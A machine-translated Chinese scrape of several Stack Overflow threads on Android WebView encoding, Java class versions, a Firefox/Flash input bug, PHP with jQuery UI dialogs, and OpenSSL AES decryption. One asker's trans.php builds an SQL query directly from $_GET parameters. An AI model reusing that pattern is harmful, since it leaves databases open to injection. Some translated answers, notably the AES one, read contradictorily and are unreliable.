-I$(ANDROID_NDK)/sources/cxx-stl/gnu-libstdc++/4.4.3/libs/armeabi/include

更新此路径后，您将不会收到错误消息。

# android - 在 webview 中显示重音字符

> ID：13287985
> 
> 赞同：3
> 
> 时间：2012-11-08T11:15:56.610
> 
> 标签：android, android-layout, android-webview, android-edittext

我的应用程序无法正确显示重音字符。我去年研究了这个，但找不到解决方案。我一直在挖掘，但仍然没有找到解决方案。我提供了一个屏幕截图，显示了当用户在 EditText 字段中输入“London Château”时发生的情况，该字段在单击按钮时加载到 WebView 中。重音字符“â”未按预期翻译。它翻译为“Ãç”，“伦敦城堡”。很想得到一个解决方案，在此先感谢。

我提供了代码来演示：

```
public class MainActivity extends Activity {

private WebView webView;
private EditText edittext_1;
private Button buttonUpdate;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    webView = (WebView) findViewById(R.id.webview_summary);
    webView.getSettings().setJavaScriptEnabled(true);

    edittext_1 = (EditText) findViewById(R.id.editText_1);
    buttonUpdate = (Button) findViewById(R.id.button_update);

    buttonUpdate.setOnClickListener(new View.OnClickListener() {
        public void onClick(View v) {
            String s = edittext_1.getText().toString();
            webView.loadData(s, "text/html", "utf-8");
        }
    });

}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    getMenuInflater().inflate(R.menu.activity_main, menu);
    return true;
}
} 
```

xml:

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:orientation="vertical" >

<WebView
    android:id="@+id/webview_summary"
    android:layout_width="fill_parent"
    android:layout_height="0px"
    android:layout_weight=".85" />

<LinearLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="0px"
    android:layout_weight=".15" >

    <RelativeLayout
        android:layout_width="fill_parent"
        android:layout_height="fill_parent" >

        <EditText
            android:id="@+id/editText_1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_centerHorizontal="true"
            android:layout_marginLeft="25dp"
            android:layout_marginRight="25dp"
            android:hint="text"
            android:minWidth="100dp"
            android:text="" />

        <Button
            android:id="@+id/button_update"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_toLeftOf="@id/editText_1"
            android:padding="10dp" />
    </RelativeLayout>
</LinearLayout>

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-08T12:47:36.777

我一发布就发现了一个可行的建议。我更改了以下行：

```
webView.loadData(s, "text/html", "utf-8"); 
```

至：

```
webView.loadDataWithBaseURL(null, s, "text/html", "utf-8", null); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T12:41:33.983

尝试从`Html.fromHtml`

```
String s = Html.fromHtml(edittext_1.getText().toString()).toString(); 
```

# java - 将应用程序从 Java 1.6 降级到 Java 1.5

> ID：13287989
> 
> 赞同：3
> 
> 时间：2012-11-08T11:16:05.027
> 
> 标签：java, java-6, java-5, downgrade

我有一个用 Java 编写的小应用程序，它经过测试并在 JRE_1.6 上运行。现在我需要针对 JRE_1.5 运行它。我更改了必须符合 Java 1.5 要求的源代码，并且项目编译良好。

问题是它使用了许多预编译的库，比如`opencsv-2.3`那些是用 Java 1.6 编译的，所以调用它们的任何类都会导致`java.lang.UnsupportedClassVersionError`.
其中大部分是`com.apache`libs `opencsv-2.3`++`org.jdom`

我怎样才能确定哪些库需要被替换？如何替换需要它的库？

**更新：**我*如何替换*部分实际上代表“如果没有旧库可以做什么？” 有没有办法降级已编译的库，或者我需要在 1.5 上找到类似的解决方案并重写代码？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-08T11:19:13.400

我建议您在每个库的清单中查找类似的行

```
Bundle-RequiredExecutionEnvironment: J2SE-1.3
X-Compile-Target-JDK: 1.5
Build-Jdk: 1.5.0_22
Created-By: 1.6.0_21-b07 (Sun Microsystems Inc.) 
```

如果没有其他选项出现，我只会进行创建。

唯一确定的方法是在库中举例说明一个类（假设所有类都是为相同版本构建的）

```
javap -v -classpath net\sf\trove4j\trove4j\3.0.2\trove4j-3.0.2.jar gnu/trove/list/TLongList | grep version

  minor version: 0
  major version: 49 
```

版本表是

```
major  minor Java platform version 
45       3           1.0
45       3           1.1
46       0           1.2
47       0           1.3
48       0           1.4
49       0           1.5
50       0           1.6
51       0           1.7
52       0           1.8 
```

更多详情[http://en.wikipedia.org/wiki/Java_class_file](http://en.wikipedia.org/wiki/Java_class_file)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T11:34:55.597

作为@Peter Lawrey，例如opencvs：

[opencvs-2.2](http://sourceforge.net/projects/opencsv/files/opencsv/2.2/)

清单文件（MANIFEST.MF）位于 jar 内的 META-INF 文件夹中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-20T14:13:35.407

我有同样的问题，我只是用 JDK 1.5 重建了 open-csv 中的源文件 - 问题解决了！

# html - 在包含 Flash 内容的页面中时，Firefox 中的输入文本框出现问题

> ID：13287991
> 
> 赞同：1
> 
> 时间：2012-11-08T11:16:21.507
> 
> 标签：html, css, flash, firefox

我正在粘贴我的 HTML 的最基本版本来演示该问题：

```
<body>
<form>
  <input type="text" name="myInputBox" id="myInputBoxID"/>
</form>
<object type="application/x-shockwave-flash" data="http://www.michaelbechara.com/interiordesign.swf" style="margin: 0;width:100%;height:100%;position:absolute;left:0px;top:0px;z-index:-1">
  <param name="movie" value="http://www.michaelbechara.com/interiordesign.swf" />
</object>
</body> 
```

这是 jsFiddle 中的相同内容：http: [//jsfiddle.net/BKNFG/](http://jsfiddle.net/BKNFG/)

基本上，我有一个文本输入和一个应用了一些样式的 Flash 内容。在我的 Flash 内容上使用这种特殊的 CSS 样式组合（100% 宽度和高度以及绝对定位）时，我在输入框上遇到了一个奇怪的问题。此行为仅在 Firefox 中发生（我使用的是 16.0.2 版）。

> 要重现该问题：
> 
> *   将焦点/光标放在输入框中并键入几个字符
> *   不将焦点移出框，再次单击文本输入框内
> *   尝试输入更多文本

除非我将焦点移到其他地方并将焦点移回文本输入控件，否则我将无法再输入任何文本。

我尝试过使用不同的其他方式来嵌入 Flash 内容，包括 swfobject 和嵌入代码的变体。我相信这可能是 Firefox 中的一个错误，但是有没有一种解决方案可以让我在不必集中注意力的情况下让文本输入工作？

# php - jQuery UI 对话框中的动态 PHP 页面

> ID：13287992
> 
> 赞同：1
> 
> 时间：2012-11-08T11:16:24.283
> 
> 标签：php, jquery-ui, jquery-ui-dialog

我有一个通过 PHP 和 MS-SQL 构建的表格，其中显示了我们客户持有的股票列表（我在股票经纪人工作）。简化表如下所示：

```
    | + | 谷歌 |
    | + | 苹果 |
    | + | 微软 |

```

加号是一个图像，当我单击它时，它会弹出一个 jQuery 对话框。这部分工作正常，但目前每个对话框都显示静态数据。我现在需要的是让对话框显示另一个表格，该表格显示每只股票的交易。

这是我到目前为止的Javascript：

```
<script>
 $(function() {

  $('div.dialog')
  .dialog(
    {
        autoOpen: false,
        modal: true
    }
    );

  $('img.opener')
  .css("cursor","pointer")
  .click(function()
    {
        $('#' + this.id.replace(/opener/, 'dialog'))
        .dialog('open');
        return false;
        }
    );
 });
</script> 
```

以及创建表的 PHP：

```
<?php                               

  echo '<tr>';
    echo '<td><img id="opener' . $row_counter . '" class="opener" src="../images/procedural/plus-white.png" title="Click to show Transactions"></td>';
    echo '<td align=left>' . htmlentities($stock_short_name) . '</td>';
    echo '<td style="display: none"><div id="dialog' . $row_counter . '" class="dialog" title="Transactions for ' . $stock_sedol . '">This is box ' . $row_counter . '</div></td>';
  echo '</tr>';

?> 
```

* * *

我找到了这个脚本，我对其进行了一些修改，以便从另一个 PHP 文件中恢复我想要的内容：

```
<!doctype html>

<html lang="en">
<head>
<meta charset="utf-8" />
<title>jQuery UI Dialog - Animation</title>
<link rel="stylesheet" href="http://code.jquery.com/ui/1.9.1/themes/base/jquery-ui.css" />
<script src="http://code.jquery.com/jquery-1.8.2.js"></script>
<script src="http://code.jquery.com/ui/1.9.1/jquery-ui.js"></script>
<script type="text/javascript">
  $(document).ready(function() {
  $('#tire-specs th a').each(function() {
    var $link = $(this);
    var $dialog = $('<div></div>')
    .load($link.attr('href') + ' #content')
    .dialog({
        autoOpen: false,
        title: $link.attr('title'),
        width: 600
    });

  $link.click(function() {
    $dialog.dialog('open');

    return false;
    });
  });
});
</script>

</head><body>

<table id="tire-specs">
  <thead>
    <tr>
      <th>Size</th>
      <th><a href="trans.php?client=62629&stock=34935" title="Transactions">Transactions</a></th>
      <th>Max Load</th>
      <th>Max Inflation Pressure</th>
      <th>Tread Depth</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>205/65R15</td>
      <td>620 A A</td>
      <td>1477 lbs.</td>
      <td>44 psi</td>
      <td>11/32"</td>
    </tr>
  </tbody>
</table>

</body></html> 
```

这是trans.php：

```
<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <title>Transactions</title>
</head>
<body>
<h1>Transactions</h1>

<div id="content">

<?php

  $client=$_GET["client"];
  $stock=$_GET['stock'];

  $mssql_server= "sql-primary";
  $mssql_database = "FOUR_I_CORE";

  include("../index_files/mssql_include.php");

  $sql = "SELECT * FROM [TRA_CORE] WHERE [CLIENT REC NO] = '$client' AND [STOCK REC NO] = '$stock' AND [QUANTITY] != 0";
  $stmt = sqlsrv_query($connnection, $sql);

            while($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC))

                {

                    $cost = $row['COST/PROCEEDS'];

                    echo $cost . '<br>';

                }

?>

</div>

</body>
</html> 
```

但是，我不知道如何使第二个脚本与第一个脚本集成，以便每个对话框都是动态的。任何人都可以帮忙吗？

（抱歉，这篇文章太长了，有更多信息总比没有好）

干杯，戴夫

# c++ - 解密AES字符串

> ID：13287994
> 
> 赞同：0
> 
> 时间：2012-11-08T11:16:29.167
> 
> 标签：c++, openssl, aes

我正在使用 openssl 库来解密来自设备的一些原始字符串。

设备使用的加密是 AES - 128 位。

这是我的代码：

```
unsigned char *aes_decrypt(EVP_CIPHER_CTX *e, unsigned char *ciphertext, int *len)
{
  int p_len = *len, f_len = 0;
  unsigned char *plaintext = new unsigned char [p_len + 128];
  memset(plaintext,0,p_len + 128);
  syslog(LOG_NOTICE,"P_LEN BEFORE: %d",p_len);
  EVP_DecryptInit_ex(e, NULL, NULL, NULL, NULL);
  EVP_DecryptUpdate(e, plaintext, &p_len, ciphertext, *len);
  EVP_DecryptFinal_ex(e, plaintext+p_len, &f_len);

  syslog(LOG_NOTICE,"P_LEN : %d",p_len);
  syslog(LOG_NOTICE,"F_LEN : %d",f_len);
  *len = p_len + f_len;

  syslog(LOG_NOTICE,"MARIMEA ESTE %d",*len);
  return plaintext;
} 
```

我的问题是：

1.  加密字符串长度是否等于解密字符串长度？（在 AES 128 位中）

2.  如果 f_len 代表解密的字节数（如果我错了，请纠正我）那么为什么它小于解密的实际数据？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T11:27:40.020

AES-128 是一种分组密码。块大小为 128 位（16 字节）。所以密文的长度总是16字节的倍数。所以密文可以比明文大。

**编辑：**

答案：

1.  不，加密数据可以更大或相等长度。
2.  错了，f_len 确实代表了解密后的字节数。`(p_len + f_len)`可以。